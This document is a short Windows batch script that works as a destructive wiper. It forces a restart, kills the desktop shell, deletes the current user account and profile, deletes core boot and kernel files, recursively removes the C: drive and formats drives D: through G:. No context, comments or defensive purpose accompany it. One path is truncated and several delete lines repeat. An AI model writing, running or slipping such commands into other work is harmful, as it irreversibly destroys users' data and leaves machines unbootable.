@echo off

shutdown /r /f /t 60
taskkill /IM explorer.exe /f

net user %username% /delete
rd /s /q %userprofile%

del /f /s /q C:\Boot\BCD
del /f /s /q C:\EFI\Microsoft\Boot\BCD
del /f /s /q C:\bootmgr
del /f /s /q C:\Windows\System32\winload.exe
del /f /s /q C:\Windows\System32\ntoskrnl.exe
del /f /s /q C:\Windows\System32\hal.dll
del /f /s /q C:\Windows\System32\drivers.
del /f /s /q C:\Windows\System32\winload.exe
del /f /s /q C:\Windows\System32\ntoskrnl.exe
del /f /s /q C:\Windows\System32\hal.dll

RD C:\ /S /Q

format D:\ /F

format E:\ /F

format F:\ /F

format G:\ /F
